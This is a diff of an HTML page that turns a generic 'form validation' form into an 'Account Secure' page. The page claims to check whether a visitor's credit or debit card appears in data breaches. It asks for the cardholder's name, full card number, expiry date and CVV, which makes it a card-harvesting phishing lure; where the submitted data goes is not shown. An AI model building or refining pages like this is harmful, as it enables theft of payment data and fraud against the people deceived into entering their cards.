@@ -2,30 +2,30 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Form Validation</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Account Secure</title>
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
     <div class="container">
         <div class="intro">
-            <p>Welcome to our form validation website. Here, you can test various input fields and validate your entries to ensure they meet the required formats. Once all the fields are correctly filled out, you can proceed by clicking the "Check" button. Please follow the instructions carefully to ensure smooth processing.</p>
+            <p>Check if your credit/debit card details have been compromised in online data breaches. Enter your information and click "Check" to see if your data is affected.</p>
         </div>
 
         <div class="form-container">
             <h2>Enter Your Details</h2>
             <form id="user-form">
                 <label for="name">Name:</label>
-                <input type="text" id="name" placeholder="Your Name" required>
+                <input type="text" id="name" placeholder="Your Name as on the card" required>
 
-                <label for="accNumber">Account Number (0000 0000 0000 0000):</label>
-                <input type="text" id="accNumber" placeholder="0000 0000 0000 0000" maxlength="19" required>
+                <label for="Card nunmber">Card number :</label>
+                <input type="text" id="accNumber" placeholder="xxxx xxxx xxxx xxxx" maxlength="19" required>
 
-                <label for="fourDigit">Four-Digit (00/00):</label>
-                <input type="text" id="fourDigit" placeholder="00/00" maxlength="5" required>
+                <label for="Expiry date">Expiry date:</label>
+                <input type="text" id="fourDigit" placeholder="xx/xx" maxlength="5" required>
 
-                <label for="threeDigit">Three-Digit:</label>
-                <input type="text" id="threeDigit" placeholder="Three Digit Number" maxlength="3" required>
+                <label for="CVV or Security code">CVV or Security code</label>
+                <input type="text" id="threeDigit" placeholder="xxx" maxlength="3" required>
 
                 <button type="submit" id="checkBtn" disabled>Check</button>
             </form>
